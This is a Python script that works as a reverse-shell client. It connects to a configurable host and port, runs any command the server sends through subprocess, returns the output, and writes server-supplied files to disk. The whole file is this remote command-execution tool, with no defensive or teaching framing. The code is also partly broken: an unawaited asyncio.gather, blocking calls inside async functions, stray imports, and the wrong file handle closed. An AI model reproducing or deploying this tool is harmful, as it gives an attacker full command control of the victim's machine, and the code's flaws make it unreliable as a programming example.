
from ast import While
from mimetypes import init
from posixpath import split
import socket
import os
import subprocess
import asyncio
HOST = '127.0.0.1'    # The remote host
PORT = 50007   
SEPARATOR = "<sep>"
s = socket.socket()
           # The same port as used by the server
class client:
    def __init__(self, HOST,PORT, SEPARATOR,s):
        self.HOST  = HOST
        self.PORT  = PORT
        self.SEPARATOR  = SEPARATOR
        self.s = s

    
    async def startconnection(self):
        self.s.connect((self.HOST, self.PORT))
        cwd = os.getcwd()
        self.s.send(cwd.encode())

        print(cwd)
    async def filecreate(self):
        filename = self.s.recv(1024).decode("utf-8")
        data = self.s.recv(1024).decode('utf-8')
        self.file = open(filename,"w")
        self.file.write(data)
        self.file.close()
        self.file2 = open(filename, "r")
        z = self.file2.read()
        print(z)
        self.file.close()
        
        
        # receive the command from the server
    async def shell(self):
        while True:

            command = self.s.recv(1024).decode()
            splited_command = command.split()
            
                # if the command is exit, just break out of the loop
                
            if splited_command[0].lower() == "cd":
                # cd command, change directory
                try:
                    os.chdir(' '.join(splited_command[1:]))
                except FileNotFoundError as e:
                    # if there is an error, set as the output
                    output = str(e)
                else:
                    # if operation is successful, empty message
                    output = ""
            elif splited_command[0].lower() == "cfile":
                os.chdir("test")
                await self.filecreate()

                output = "*FILE CREATED*"

            else:
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
            
            # get the current working directory as output
            cwd = os.getcwd()
            # send the results back to the server
            message = f"{output}{SEPARATOR}{cwd}"
            self.s.send(message.encode())
        s.close()

klient = client(HOST,PORT,SEPARATOR,s)
async def main():
    asyncio.gather(
    klient.startconnection(),
    klient.shell(),
    klient.filecreate(),

    )
asyncio.run(main())